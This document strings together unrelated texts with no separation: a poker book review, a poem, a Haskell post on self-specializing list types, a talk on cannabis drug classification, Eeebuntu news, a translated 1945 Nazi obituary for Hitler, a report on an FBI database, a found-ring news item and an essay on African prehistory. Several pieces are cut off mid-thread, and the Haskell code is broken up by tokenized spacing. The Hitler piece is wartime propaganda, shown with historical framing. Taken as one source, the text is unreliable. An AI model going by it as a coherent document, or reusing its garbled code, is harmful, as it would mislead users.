Value is a tough thing to judge since it ’s pretty relative to what the individual can afford .
What we can say is that you ’re certainly paying more dollars per idea for this book than for competing titles .
Another complaint :
The book is littered with hand examples , which is a good thing .
However , their dry layout – while possibly appealing to forum readers used to a converted HH format – often renders them awkwardly separate from the accompanying text , and misses an opportunity to engage the reader .
Conclusion
The ideas and advice in this book are bound to improve the game of anyone who reads it .
Whether that ’s worth the price is up to each individual .
Focus : 8/10
The book is tight in each individual chapter , but sometimes jumps from idea to idea inbetween chapters without a clear motivation .
Quality of advice : 10/10
Some interesting insights backed up with an arsenal of varied support .
Examples : 7/10
Sufficient , but not always integrated well into the text .
Readability : 7/10
It ’s picky , but there are a number of small grammatical issues with this book that interrupt the flow for the reader .

I get the call
that something ’s showed up
and I go back to be

The wand felt good
sliding over my warm gelled breasts .
As it bumped my nipple
I dared not look at its response .
Then “ it ” appeared ,
was marked and printed

for me to take home :
my sideways valentine ,
my heart shaped

so tired and hungry
lying there alone .

Murderous soldiers :
micro slaughter

The joke of radiation :
pissing out the glow ,

There are lots of optimization opportunities in a statically typed , purely functional language .
This post describes an approach that improves the performance of off - the - shelf Haskell list functions by about 25 % on average .
The code is available as a drop - in replacement for Data .
List .
This is part of an ongoing series on high - performance Haskell programming .
Related posts include stream fusion for lists , programming the inliner , Judy arrays and Haskell , making binary parsing faster and applying stream fusion to arrays .
Background
Statically typed , purely functional code is a sweet spot for optimization hackers .
All that information available at compile time lets us write some pretty radical transformations , and know they are safe .
Stream fusion , for example , relies on having type and effect information available statically , and uses that to make complexity - changing rewrites of your code .
Clever algebraic transformations such as call - pattern specialization can make some pretty aggressive performance improvements .
We can also make the runtime more efficient : by introducing parallelism , or again , exploiting type and effect information via pointer tagging .
All this is easier in a strongly , statically typed and pure setting — there ’s just less stuff you have to worry about when doing the transformations .
This post introduces an optimization technique based on types : self - optimizing polymorphic data types .
When instantiated to a particular type , the code presented will generate both a custom , specialized data structure , and specialized functions over that type .
The result is a general mechanism to improve the data density , and thus performance , of parametrically polymorphic data structures ( where the same code operates generically on any type ) , such as lists , trees and finite maps .
The general concept should be useful in any language with parametrically polymorphic types , and its implementation in Haskell , via class - associated data types is particularly elegant ( requiring no compiler modification ) .
Polymorphism
Parametric polymorphism is a great programmer tool .
It improves expressivity , by letting the programmer use the same code at any possible type , yet still retains type safety .
For example , the list type is a polymorphic type , and the length function computes the length of any lists , no matter what the element type is .
--
The list type : either empty , or cons , holds any type ' a ' data [ ] a = [ ] | a : [ a ]
Prelude > :t length length :: [ a ] ->
Int
The type system ensures that we can never write length to depend on a property of the element type , ensuring the code is maximally generic .
It is simply not possible to mess with the elements of the list , given the type .
Any attempt to do so will be a compiler error .
This gives us some strong guarantees of abstraction , which we will take advantage of for optimization purposes .
Such polymorphic types and functions are flexible , but we pay a cost for this .
In order for the code to work on any type ‘ a ’ , we must ensure that all values have a uniform representation .
In most languages , this is via an object or closure – some reference to heap allocated data – and Haskell is no exception .
All polymorphic components will be stored as pointers to heap allocated thunks .
You can see this tradeoff most vividly in this picture of a list of pairs :
The uniform representation means that all values are represented via pointers to values , so the same code ( e.g. map , filter ) will work on any element type .
But look .. we have cons nodes with pointers to pair nodes , which in turn point to integer nodes .
( Also note the explicit sharing that is visible – the integer 1 and 2 are shared between multiple uses – made possible by purity ) .
Such a structure is generic , but has poor data density .
If the compiler could see that the integer nodes hold word - sized values , it could unpack them into their constructors .
GHC can already unpack monomorphic types , removing all indirection and ‘ thunkiness ’ associated with the data , via a manual unpack pragma at the data declaration site :
data PairIntInt = Pair {-# UNPACK #-} Int {-# UNPACK #-} Int
The Int values will now just be stored directly as word - sized fields in the Pair heap object .
GHC can also infer the location of these pragmas if you use strict fields , and enable the - funbox - strict - fields optimization :
data PairIntInt = Pair !
Int !
Int
However , this technique only works on monomorphic fields .
It does not make sense for polymorphic fields , since they have variable size , and the compiler does not ( except in very specific circumstances ) have access to information about what types are in use .
To unpack , say , all elements of a list of pairs , we need to instead generate a custom type :
data ListPairs = Empty | Cons !
Int !
Int ListPairs
This will happily represent each node with all elements stored locally , but is no longer polymorphic – so any functions have to be written specially for this type .
The result however , is a much denser data representation :
Note that unpacking changes the evaluation strategy of the data .
Those elements are now strict .
The spine of the list is still lazy , however , so it is still just as useful a type for control structures and generators .
GHC is remarkably flexible about the control the programmer has over the evaluation strategy ( strict , lazy , mixture ) , so we ’ll take advantage of that in this library to produce a spine - lazy , element strict list type that is able to do this unpacking and specialization for us .
I encourage you to explore mixed strict and lazy structures as well .
( An aside : these graphs were generated directly from the live Haskell heap via vacuum – another great new tool for Haskell development .
I ’ve not written about this yet , but you can see a video of it in use here .
You can trace any Haskell heap structure to a graph representation , saving it as svg or png , or inspecting it live from the REPL ) .
So , how do we teach GHC to do this transformation automatically , and how do we do that without sacrificing code reuse — I only want to write the list library once !
Class - associated data types
Our problem can be stated as :
when we use a data structure at a particular element type , we require both custom functions , and a custom data type , to be generated
This gives us an insight into how to produce a solution .
Type classes in Haskell are precisely the mechanism for having per-type functions .
And a recent major extension to type classes has been the addition of class - associated data types ( in their most general form , as type families ) .
These two features together will allow us to specialize the container type at each element type , and generate specialized functions for each use , removing “ the uniform - representation tax ” and improving performance across the board .
Implementation
Where previously , the data type for lists is defined as :
data [ ] a = [ ] | a : [ a ]
we will instead associate the data type with a class , and leave the implementation to later :
We also have to lift the introduction and elimination forms for the type into the class ( as we have no explicit constructors or pattern matching anymore ) :
class AdaptList a where data List a
-- |
The empty list empty :: List a -- |
Prepend a value onto a list cons :: a -> List a ->
List a -- |
Is the list empty ?
null :: List a ->
Bool -- |
The first element of the list head :: List a -> a -- |
The tail of the list tail :: List a ->
List a
Now we just need to write some functions over this abstract list type .
First , conversion , to and from “ real ” lists :
-- | / O( n ) / , convert an adaptive list to a regular list toList :: AdaptList a => List a -> [ a ] toList xs | null xs = [ ] | otherwise = head xs : toList ( tail xs ) -- | / O( n ) / , convert an adaptive list to a regular list fromList :: AdaptList a = > [ a ] -> List a fromList [ ] = empty fromList ( x:xs ) = x `cons` fromList xs
Note how we have to replace explicit pattern matching with calls to the elimination forms ( head , tail , uncons ) , and constructors are replaced with calls into the type class methods ( cons , empty ) .
We will see that GHC is able to inline away all the type class dictionaries , resulting in specialized code when used at any specific type .
Some general functions on lists : map , fold , filter :
-- | / O( n ) /. ' map ' @f xs@ is the list obtained by applying @f@ to each element -- of @xs@ -- map :: ( AdaptList a , AdaptList b ) => ( a -> b ) ->
List a ->
List b map f as = go as where go xs | null xs = empty | otherwise = f ( head xs ) `cons` go ( tail xs ) {-# INLINE map #-}
-- | / O( n ) /. ' foldl ' , applied to a binary operator , a starting value ( typically -- the left - identity of the operator ) , and a list , reduces the list -- using the binary operator , from left to right -- foldl :: AdaptList b => ( a -> b -> a ) -> a ->
List b -> a foldl f z0 xs0 = go z0 xs0 where go !z xs | null xs = z | otherwise = go ( f z ( head xs ) ) ( tail xs ) {-# INLINE foldl #-} -- | / O( n ) /. ' filter ' , applied to a predicate and a list , returns the list of -- those elements that satisfy the predicate -- filter :: AdaptList a => ( a -> Bool ) ->
List a ->
List a filter p xs0 | null xs0 = empty | otherwise = go xs0 where go xs | null xs = empty | p x = x `cons` go ys | otherwise = go ys where x = head xs ys = tail xs {-# INLINE filter #-}
These implementations are essentially identical to the Haskell98 Prelude definitions , but with all constructors replaced with type class methods , and pattern matching replaced with “ smart deconstructors ” .
Also , all recursive functions are written in worker / wrapper style , so they may be inlined ( crucial to enable the function to be specialized ) .
So now we have an interface to lists and functions on them , but no concrete list type defined .
We will do this via a class - associated type , with one instance for each element type we care about .
This is a generic strategy , and so can be automated via some SYB - style generic code generation tricks .
The result is a set of instances enumerating all the different specialized data representations statically :
instance AdaptList
Int where data List Int = EmptyInt | ConsInt {-# UNPACK #-}! Int ( List Int ) empty = EmptyInt cons = ConsInt null EmptyInt =
True null _ = False head EmptyInt = errorEmptyList " head " head ( ConsInt x _ ) = x tail Empty Int = errorEmptyList " tail " tail ( ConsInt _ x ) = x
And so on for all the other types .
Now , when we write a function on say , List Int , GHC will replace all our code with the specialized data type , where the Int elements are unpacked .
All calls to the smart constructors and deconstructors will be replaced with the specialized versions as well .
We should thus get denser , faster list types and functions .
You can see the full implementation here , as well as the same technique applied to sums and products , and with the full list API filled out .
I ’m calling these “ adaptive ” data structures , as they adapt to a different shape based on how you use them .
Let ’s benchmark and see if things get any faster .
As usual , I will use criterion to do the measurement and graphing .
The best open source benchmarking library around – makes benchmarking fun , the way QuickCheck makes testing fun .
Benchmarks : map
In these benchmarks , I ’m measuring the standard GHC 6.10 Data .
List functions , and the base list data type , against the version on Hackage .
In each case , I generate 100 k random integers ( using the mersenne - random generator ) , build a list from those numbers , and measure the time to traverse the structure using each pair of functions .
Criterion takes care of running the functions hundreds of times until meaningful data can be extracted .
The execution time probability graphs are presented here .
Note that they ’re on different scales each time .
So , the numbers .
Specialized map is 34 % faster .
Mean goes from 31.9 ms to 21.2 ms .
Garbage collection is reduced by 40 % ( which seems typical across the board for these functions .
Regular Haskell list type and functions :
Specializing list map : :
Looking at the core , we see that when used at an Int type , we get a specialized loop with unboxed parameters generated ( no additional un - or re-boxing is required to store values back into the data structure ! ) .
This is a transformation GHC can’t do automatically , due to the uniform representation requirement .
Here ’s the core for ‘ adaptive sum ’ , taken from ghc - core ,
$ wgo :: Data .
Adaptive .
List .
List Int ->
Int# ->
Int# $ wgo xs n = case xs of EmptyInt -> n ConsInt y ys -> $ wgo ys ( +# n y )
Compared to regular lists , we see the additional unboxing of the list parameter that is required :
$ wlgo :: Int# -> [ Int ] ->
Int# $ wlgo n xs = case xs of [ ] -> n ( y:ys ) -> case y of I# y# -> $ wlgo (+# n y# ) ys
Benchmarks : filter
Filter is 15 % faster .
Mean goes from 42.5 ms to 36.2 ms .
Specialized version :
Benchmarks : foldl
Reducing a list is 23 % faster ( sum , length , maximum , product , minimum ) .
Mean goes from 11.2 ms to 8.7ms .
and when specialized :
Notes
One of the obivous questions is : what about fusion ?
Stream fusion is an entirely different automatic optimization that optimizes multiple traversals over a data structure into a single , more complicated traversal , dramatically improving time and space usage .
The data structures and functions shown in this post complement fusion well — we can still fuse loops , on speciazlied data and functions , removing unnecessary traversals .
Stream fusion also enables opportunities for specialization , which will no longer be of much use , as our data types have specialized themselves .
We also lose sharing in this approach .
Sorry , but your Int fields will be copied by value .
The approach makes most sense for small atomic types anyway , which may be unpacked , and these are precisely the types where sharing is unlikely to be helpful .
Essentially , we now treat the list type and constructors as an abstract view on to some custom , specialized representation .
We may be able to regain pattern matching on the abstract structures via GHC ’s view patterns .
I ’ve not tried this yet , but it looks easy enough .
The list implementation is a useful proof of concept — you can use it in your list - heavy programs today if you want .
The most promising direction , though , in my view , is for container types such as IntMap and Sequence , where already the constructors are abstract , and there ’s a small set of primitive operations , and we really care about data density .
There may be some big wins for coalescing of nodes in IntMap , for example .
Results
In summary , we have a general approach to allow , for the first time , uniform specialization of both parametrically polymorphic functions and data , resulting in good speedups with only library modifications required .
The Haskell type system , via class - associated type classes , is sufficiently expressive to describe abstract and concrete representation mappings , and the GHC optimizer ( particular the inliner , and the unpacking pragma ) are enough to precisely control the layout of data , along with the generation of custom functions for each type .
The approach should give speedups in any language with a uniform representation policy , though it is certainly easier when you do n’t need to modify the compiler .
The approach here is very specific , and may be subsumed by more general global information optimization techniques , such as super compilation ( coming to GHC ) .
We also rely on the magic of the GHC Inliner to remove all traces of type class dictionaries .
The next steps will be to combine this with list fusion , to have the fastest lazy lists I know of , and to try it out on IntMap and friends , to yield faster polymorphic container types .
The result is satisfying : your Haskell code goes faster , while remaining high level and pure .
Further reading
This is the first time I ’ve written down this approach , but the idea has been kicking around for a few months .
You can see my WG2.8 talk on the subject here , and a video of my talking about initial experiments in this direction at the Utrecht hackathon .
I ’d be interested if readers know of any related work for this joint - specialization of data and function code , to eliminate the indirection cost of parametric polymorphism .
As the headlines this week alone demonstrate , the whole process of determining drug classification has become quite complex and highly politicised .
I focus on cannabis partly because it is the only drug that has been downgraded in the whole history of the 1971 Misuse of Drugs Act , which established the present system of drug classification , but also because the issues relating to cannabis pose a challenge to whether the act is working as it was originally intended .
The Advisory Council on the Misuse of Drugs ( ACMD ) was requested by the home secretary in 2007 to review the status of cannabis because : " Though statistics show that cannabis use has fallen significantly , there is real public concern about the potential mental health effects of cannabis use , in particular the use of stronger forms of the drug , commonly known as skunk . "
So , there was a skunk scare .
Cannabis had gone from class B to C , but , supposedly , skunk use had been increasing and it was getting stronger , so we were asked to review whether the decision to go from B to C was still appropriate .
In what was the ACMD 's third cannabis report ( Rawlins et al , 2008 ) , we came to several conclusions :
● Cannabis is a harmful drug and there are concerns about the widespread use of cannabis among young people .
● A concerted public health response is required to drastically reduce its use .
● Current evidence suggests a probable , but weak , causal link between psychotic illness and cannabis use .
● The harms caused by cannabis are not considered to be as serious as drugs in class B and therefore it should remain a class C drug .
On that final point , there has been a lot of commentary and some research as to whether cannabis is associated with schizophrenia , and the results are really quite difficult to interpret .
What we can say is that cannabis use is associated with an increased experience of psychotic disorders .
That is quite a complicated thing to disentangle because , of course , the reason people take cannabis is that it produces a change in their mental state .
These changes are a bit akin to being psychotic – they include distortions of perception , especially in visual and auditory perception , as well as in the way one thinks .
So it can be quite hard to know whether , when you analyse the incidence of psychotic disorders with cannabis , you are simply looking at the acute effects of cannabis , as opposed to some consequence of cannabis use .
If we look on the generous side , there is a likelihood that taking cannabis , particularly if you use a lot of it , will make you more prone to having psychotic experiences .
That includes schizophrenia .
But schizophrenia is a relatively rare condition , so it 's very hard to be sure about its causation .
The analysis we came up with was that smokers of cannabis are about 2.6 times more likely to have a psychotic - like experience than non-smokers .
To put that figure in proportion , you are 20 times more likely to get lung cancer if you smoke tobacco than if you do n't .
The other paradox is that schizophrenia seems to be disappearing ( from the general population ) , even though cannabis use has increased markedly in the last 30 years .
So , even though skunk has been around now for 10 years , there has been no upswing in schizophrenia .
In fact , where people have looked , they have n't found any evidence linking cannabis use in a population and schizophrenia .
Nevertheless , one of the key arguments in moving cannabis from class C to B was the concern that skunk would cause more psychosis .
What is very regularly invoked in this debate is the precautionary principle , which is that , if you 're not sure about a drug harm , rank it high , make all drugs class A and get rid of the problem .
In her statement to the Commons , after receiving the ACMD 's report but rejecting its recommendation to keep cannabis as a class C drug , Jacqui Smith , the former home secretary , said : " We must err on the side of caution and protect the public . "
As this is protection from the known unknowns , at first sight it might seem the obvious decision – why would n't you take the precautionary principle ?
But the precautionary principle is also an act of faith in deterrence , and this is one of the key issues for lawyers .
Does deterrence impact on drug use ?
We do n't know .
In fact , the outcome may be the opposite of that predicted .
It may be that if you move a drug up a class , it has a greater cachet .
I think we have to accept young people like to experiment , and what we should be doing is to protect them from harm at this stage of their lives .
We therefore have to provide more accurate and credible information .
We have to tell them the truth , so that they use us as their preferred source of information .
If you think that scaring kids will stop them using , you 're probably wrong .

Eeebuntu is a custom Linux distribution based on Ubuntu that ’s designed specifically for netbooks .
It supports a the hardware found on most Asus Eee PC netbooks and a number of similar models from other companies , and it ’s optimized for the Intel Atom processor and low resolution displays .
A few days ago one of the members of the Eeebuntu Linux development team threw up his hands in exasperation complaining that every time a new version of Ubuntu Linux came out , it broke compatibility with Eeebuntu .
Now another member of the dev team has posted on the Eebuntu forum that the team has decided to move away from Ubuntu in its next release .
Instead , Eeebuntu 4.0 will be based on Debian Unstable .
This means four things :
The developers will have more control over the project and more flexibility in the applications and updates added to the project Instead of expecting new releases every 6 months or so , you should see releases when they ’re ready ( which could be either faster or slower than the current release cycle )
The team plans to add support for desktops , not just netbooks
The name “ Eeebuntu ” is going to start sounding a bit silly
The next version is scheduled for release in late December , but a lot can change between now and then .
There will be beta versions available before that time though .

Background :
By the end of the war , German newspapers were reduced to single sheets .
This is the commentary on Hitler ’s death by a Hamburg newspaper , dated Wednesday , 2 May 1945 .
The rest of the issue includes grim military news ( Allied forces were nearing Hamburg ) , a surprising bit of sports news ( including an upcoming table tennis match ) , and many brief death notices .
I here translate three items dealing with Hitler ’s death .
Herman Okraß , the author of the first article , an obituary for Hitler , was an early Nazi who had written a book on the early years of the movement .
He was the paper ’s editor .
After the war , he was sentenced to a prison term , but was released due to time already served .
The second item is an appeal to keep fighting from Hamburg ’s Gauleiter Karl Kaufmann
The third item is on world press reaction to the approaching end of the war .
The source : Hermann Okraß , “ Abschied von Hitler , ” Hamburger Zeitung , 2 May 1945 , p. 1 . Farewell to Hitler
He once said : “ I wish nothing on my gravestone other than my name . ”
Even his name will probably not stand over his grave , for we know that he must have perished while fighting bitterly in the Reich Chancellery .
We know that the enemy will be able to find a body in the ruins caused by countless artillery shells and countless flame throwers , and that they may say that it is the Führer ’s body , but we will not believe it .
If the enemy says that , we will not believe it .
That his body is dead we believe , what is mortal of him has perished , has passed away , but he has fulfilled his most beautiful oath , this affirmation : “ The most valuable thing God has given me on this world is my people .
My faith rests on it , I serve it with my will , and I give my life to it . ”
His life is fulfilled .
He began by fighting for his people , and he ended that way .
A life of battle .
Now the world will attempt to explain him .
Books will be written about him , some praising , others cursing him .
People will criticize him , people will pray for him .
A great one has left this world , and where a strong , bright light is extinguished , creatures suddenly appear in the twilight that had hidden from the bright light .
That is all foreign to us , far from our way of thinking .
For this we affirm :
We swore an oath to this man and his teachings , we pledged ourselves to him during our people ’s dark days , we rose with him to the heights to which he led our people in the brief , beautiful years of peace , and like all good Germans , we stood by him in battle .
The world should not appear small and shabby to us because the victors can rejoice .
We can confidently leave his judgment to world history .
We today cannot decide it .
But will posterity be able to understand him fully ?
It is hard for contemporaries to pass judgment about someone of their own era , particularly if it is one as unique as Adolf Hitler .
Posterity sees the great from a distance , reads his words , reads our words , but it cannot understand the world of our day in all of is breadth .
One can only hope that they believe the great words of the great man .
“ One could give me whole parts of the earth , but I would rather remain the poorest citizen of this state . —
I am not so crazy as to want war . —
I was a worker in my youth , and have remained one in my inmost being .
—
We are not fighting for theories , nor for dogmas .
It make no difference whether or not we live .
The only thing that is important is that our people lives ! ”
How will these words sound to posterity ?
Will they be able to understand why a whole people , in the midst of its deepest poverty , affirmed this man ?
We may only hope so , for we know that world history will then truly understand this man , his teachings , and our age .
We see that more clearly today than ever before , we see it proven by the immeasurably hard battle that our people has withstood so bravely , we see it in the silent unspoken loyalty of the poorest sons of our people that Adolf Hitler gathered as a lens that focuses all light on a single point ; the most beautiful virtues , the most fervent desires , the noblest longings , the beautiful will of our people , the longing for the Reich , the drive for social justice , the will for freedom , for clear leadership , our people saw that all united in Adolf Hitler and his idea .
That little minds darkened the image of his clear will , that traitors and bad counselors deserted and betrayed him , that finally he was overcome by a great superiority of steel and money , that cannot change the image of him that is in the deepest heart of our people .
The present hour may perhaps dim that image , the enormous sacrifices , the sorrow and misery , may distort it , but when one day the senses clear , when thoughts are once again free , he will appear once more even to the last people ’s comrade as he did in days in which the whole nation joyfully affirmed him .
The man is dead .
He fell fighting .
He remained loyal to himself .
He wanted the best for his people , which is why it loved him so much .
We know that he will continue to live in our land not as a war hero in the form of a metal statue , but rather as a child of the people whose pure will the people understood , and whose most beautiful words will remain a memorial for us , his words that in a people ’s deepest need , one must love his people more than himself .
The Gauleiter ’s strong appeal to the citizens of Hamburg Karl Kaufmann , Gauleiter and Reich Governor of Hamburg , spoke over the radio to the population of Hamburg .
He said : Party comrades !
People ’s comrades !
It was the gravest hour of our people as the news reached us today that our Führer died fighting in the Reich capital .
History will one day proclaim what he was to us old National Socialists , what he strived to achieve for his people .
He leaves behind the immortal idea of the National Socialist Reich , which obligates us to remain true to our people in our people ’s deepest need , to work for this people , to live and die for it .
In this hour , my citizens of Hamburg , my most fervent wish is this : that you put your fate and your future confidently in my hands , as before , and that you follow me in unshakable faith and unshakable discipline along the hard path that I will follow to the end for the good of the city and its people that are entrusted to me .
[ The next day , Kaufmann surrendered the city without a fight . ]
Foreign Reports
In the world press , the news of Adolf Hitler ’s death overshadowed the numerous accounts of Count Folke Berndadotte ’s mission , which had been the center of attention in recent days .
Bernadotte , who returned to Stockholm on Tuesday , stated that he had not had a new meeting with Himmler , and had therefore received no offer of surrender from him .
Sources in Stockholm claim that the Count did hold talks with other German leaders , among them General Field Marshal von Busch and Grand Admiral Dönitz .
In contrast to the high expectations that the reports of surrender has caused in the House of Commons , Prime Minister Churchill replied to the question of whether he wanted to make a statement by saying : “ No , other than that the situation is more satisfying than it was five years ago . ”
Churchill also made no statement about the withdrawal of German troops from areas they still occupy .
He was unable to say what form the news about the actual end of the war would take , or whether weapons would be laid down simultaneously on all fronts .
If a statement became necessary , he would not withhold it for a moment , but would ask the speaker for time to make a statement .
During the course of the debate , it became clear that Prime Minister Churchill himself will announce a surrender or armistice over the radio , and that the King of England intends to speak to his people and to the British Empire .
The King wishes that the following Sunday be a day of prayer and thanksgiving .
The Allied powers have accepted a German offer to release Allied prisoners of war held in its camps .

More than 1.5 billion government and private sector records about US citizens and foreigners are stored in an FBI database , declassified documents have revealed .
The database is kept at the FBI 's National Security Branch Analysis Center ( NSAC ) near Washington , according to the documents acquired under a freedom of information request by US magazine Wired .
Data has been drawn from a wide variety of sources , including records of international travel , hotel bookings , car rentals , department store transactions and active aircraft pilots .
The FBI data mining system brings the US government closer than ever to implementing the total information awareness system proposed by the Pentagon after the September 11 attacks , reports said .
Such a system would be designed to correlate data from a large number of different sources to automatically identify potential terrorists and other threats .
But the proposal has been criticised by privacy groups as ineffective and invasive .
They say the declassified documents show that the government is going ahead with the plan in secret and without strict independent supervision by public bodies .
Critics have expressed concern that the US government is using an unproven technology that could give false positives that would subject innocent people to unnecessary scrutiny .
Strict enforcement of data protection legislation is the only way to guard against secret FBI - style databases of personal information , says a UK - based security expert .
Peter Sommer , professor of security at the London School of Economics , said huge amounts of information are collected by commercial organisations as part of ' legitimate customer profiling ' .
" The problem is that it is only rigorous enforcement of data protection legislation which prevents them being used to form a large data mining operation by intelligence agencies , " he said .
Sommer said this was the reason for that it is important for privacy watchdogs like the UK's Information Commissioner 's Office ( ICO ) to have sufficient powers and resources .
According to data mining firm Detica , most people do not realise how many organisations are collecting their " digital footprints " as they roam the internet and communicate with their friends .
Anthony Golledge , head of Detica 's technical consulting practice said that technology was changing so fast that most people were not aware of how many " digital footprints " they leave as they surf the internet , travel and use their mobile phones .
NORFOLK , Va. , Oct. 8 ( UPI ) -- A Virginia college student reaped a $ 10,000 reward Thursday when he returned a 15 - carat diamond ring he found in a parking lot to its rightful owner .
Jeremy McIntosh told The Virginian - Pilot he found the ring in the middle of September outside a dry cleaner where he works to put himself through Norfolk State University .

" At first when I saw it , it was unbelievable , " McIntosh said .
" I thought it was a fake . "
But he realized quickly the ring was valuable .
He learned Thursday morning from a story in the newspaper that the ring , valued at $ 96,000 , belonged to James Ramsey of Norfolk .
Ramsey had been searching for the ring for weeks .
He now thinks it dropped out of a pocket when his fiancee took his clothes to the cleaners .
The exchange took place at the Zoots Dry Cleaners in Chesapeake , where McIntosh is the manager .
He hurried to the bank with an envelope full of $ 100 bills .
McIntosh has big plans for the money , paying off credit cards and the loan on his used Nissan Maxima .
" And then maybe I 'll get a new pair of shoes or take some friends out to dinner , " he said .
Despite all I 'd read about Africa , my first impressions upon being there were overwhelming .
As I walked the streets of Windhoek , the capital of newly independent Namibia , I saw black Herero people and black Ovambo ; I saw Nama , a group quite unlike the blacks in appearance ; I saw whites , descendants of recent European immigrants ; and outside Windhoek I saw the last of the formerly widespread Kalahari Bushmen struggling for survival .
These people were no longer pictures in a textbook ; they were living humans , right in front of me .
But what most surprised me was a street sign on one of downtown Windhoek 's main roads .
It read GOERING STREET .
Surely , I thought , no country could be so dominated by unrepentant Nazis that it would name a street after Hermann Goering , the notorious head of the Luftwaffe .
As it turned out , the street actually commemorates Hermann 's father , Heinrich , founding Reichskommissar of the German colony of South - West Africa , which would later be renamed Namibia .
But Heinrich is no less a problematic figure than his son : his legacy includes one of the most vicious attacks ever carried out by European colonists on Africans , Germany 's 1904 War of Extermination against the Herero .
Today , while events in neighboring South Africa command the world 's attention , Namibia , too , struggles to deal with its colonial history and establish a multiracial society .
Namibia illustrated for me how inseparable Africa 's past is from its present .
Most Americans think of native Africans as black and of white Africans as recent intruders ; and when they think of Africa 's racial history they think of European colonialism and slave trading .
But very different types of peoples occupied much of Africa until as recently as a few thousand years ago .
Even before the arrival of white colonialists , the continent harbored five of what many consider to be the world 's six major divisions of humanity , the so - called human races , three of which are native to Africa .
To this day nearly 30 percent of the world 's languages are spoken only in Africa .
No other continent even approaches this human diversity , and no other continent can rival Africa in the complexity of its human past .
The diversity of Africa 's peoples results from its diverse geography and long prehistory .
Africa is the only continent to extend from the northern to the southern temperate zone ; it encompasses some of the world 's driest deserts , largest tropical rain forests , and highest equatorial mountains .
Humans have lived in Africa far longer than anywhere else : our remote ancestors originated there some 7 million years ago .
With so much time , Africa 's peoples have woven a complex , fascinating story of human interaction , a story that includes two of the most dramatic population movements of the past 5,000 years : the Bantu expansion and the Indonesian colonization of Madagascar .
All those interactions are now tangled up in politics because the details of who arrived where before whom are shaping Africa today .
How did the five divisions of humanity in Africa get to be where they are today ?
Why did blacks come to be so widespread , instead of one or more of the four other groups whose existence Americans tend to forget ?
How can we ever hope to wrest the answers to these questions from Africa 's past without written evidence of the sort that taught us about the spread of the Roman Empire ?
African prehistory is a detective story on a grand scale , still only partly solved .
Clues can be derived from the present : from the peoples living today in Africa , the languages they speak , and their plant crops and domestic animals .
Clues can also be dug up from the past , from the bones and artifacts of long - dead peoples .
By examining these clues one at a time and then combining all of them , we can begin to reconstruct who moved where at what time in Africa , and what let them move — with enormous consequences for the modern continent .
As I mentioned , the Africa encountered by the first European explorers in the fifteenth century was already home to five human races : blacks , whites , Pygmies , Khoisan , and Asians .
The only race not found in Africa is the aboriginal Australians and their relatives .
Now , I know that classifying people into arbitrary races is stereotyping .
Each of these groups is actually very diverse , and lumping people as different as the Zulu , Masai , and Ibo under the single heading " blacks " ignores the differences between them .
So does lumping Africa 's Egyptians and Berbers with each other and with Europe 's Swedes under the single heading " whites . "
The divisions between blacks , whites , and the other major groups are arbitrary anyway because each group shades into the others .
All the human groups on Earth have mated with humans of every other group they 've encountered .
Nevertheless , recognizing these major groups and calling them by these inexact names is a shorthand that makes it easier to understand history .
By analogy , it 's also useful to divide classical music into periods like " baroque , " " classical , " and " romantic , " even though each period is diverse and shades into other periods .
By the time European colonialists arrived , most of Africa 's major population movements had already taken place ( see map on next page ) .
Blacks occupied the largest area , from the southern Sahara to most of sub-Saharan Africa .
The ancestors of most African Americans came from Africa 's western coastal zone , but similar peoples occupied East Africa as well , north to the Sudan and south to the southeast coast of South Africa .
They were mostly farmers or herders , as were the native African whites , who occupied Africa 's northern coastal zone and the northern Sahara .
( Few of those northern Africans — the Egyptians , Libyans , and Moroccans , for instance — would be confused with a blond , blue - eyed Swede , but they 're often considered white because they have lighter skin and straighter hair than the peoples to the south . )
At the same time , the Pygmies were already living in groups widely scattered through the central African rain forest .
Although they were traditionally hunter - gatherers , they also traded with or worked for neighboring black farmers .
Like their neighbors , the Pygmies are dark - skinned and have tightly curled hair , but that hair is more thickly distributed over their body and face .
They also are much smaller in size and have more prominent foreheads , eyes , and teeth .
The Khoisan ( pronounced COY - san ) are perhaps the group least familiar to Americans today .
In the 1400s they were actually two groups , found over much of southern Africa : large - statured Khoi herders , pejoratively known as Hottentots , and smaller San hunter - gatherers , pejoratively called Bushmen .
Most of the Khoi populations no longer exist ; European colonists shot , displaced , or infected many of them , and the survivors interbred with Europeans .
Though the San hunter - gatherers were similarly shot , displaced , and infected , a dwindling number managed to preserve their distinctness in Namibian desert areas unsuitable for agriculture .
( They 're the people depicted some years ago in the widely seen film The Gods Must Be Crazy . )
The Khoisan today look quite unlike African blacks : they have light brown skin sometimes described as yellow , and their hair is even more tightly coiled .
Of these population distributions , that of North Africa 's whites is the least surprising because physically similar peoples live in adjacent areas of the Middle East and Europe .
Throughout recorded history people have been moving back and forth between Europe , the Middle East , and North Africa .
But the puzzling placements of blacks , Pygmies , and Khoisan hint at past population upheavals .
Today there are just 200,000 Pygmies scattered amid 120 million blacks .
This fragmentation suggests that Pygmy hunters lived throughout the equatorial forests until they were displaced and isolated into small groups by the arrival of black farmers .
Similarly , the Khoisan area of southern Africa is surprisingly small for a people so distinct in anatomy and language .
Could the Khoisan as well have been originally more widespread until their more northerly populations were somehow eliminated ?
Perhaps the greatest puzzle , however , involves the island of Madagascar , which lies just 250 miles off the coast of southeastern Africa , much closer to Africa than to any other continent .
It 's in Madagascar that the fifth African race is found .
Madagascar 's people prove to be a mixture of two elements : African blacks and — surprisingly , given the separation seemingly dictated by the whole expanse of the Indian Ocean — Southeast Asians , specifically Indonesians .
As it happens , the language of the Malagasy people is very close to the Ma'anyan language spoken on the Indonesian island of Borneo , over 4,000 miles away .
No one even remotely resembling the Borneans lives within thousands of miles of Madagascar .
These Indonesians , their language , and their modified culture were already established on Madagascar by the time it was first visited by Europeans in 1500 .
To me this is the single most astonishing fact of human geography in the whole world .
It 's as if Columbus , on reaching Cuba , had found it occupied by blue - eyed , towheaded Scandinavians speaking a language close to Swedish , even though the nearby North American continent was inhabited by Indians speaking Indian languages .
How on earth could prehistoric people of Borneo , presumably voyaging in boats without maps or compasses , have ended up in Madagascar ?
The case of Madagascar shows how peoples ' languages , as well as their physical appearance , can yield important clues to their origins .
Similarly , there 's much to be learned from African languages that can't be gleaned from African faces .
In 1963 the mind - boggling complexities of Africa 's 1,500 languages were simplified by the great linguist Joseph Greenberg of Stanford .
Greenberg recognized that all those languages can be divided into just four broad families .
And , because languages of a given language family tend to be spoken by distinct peoples , in Africa there are some rough correspondences between the language families and the anatomically defined human groups ( see map at right ) .
For instance , Nilo - Saharan and Niger - Congo speakers are black , and Khoisan speakers are Khoisan .
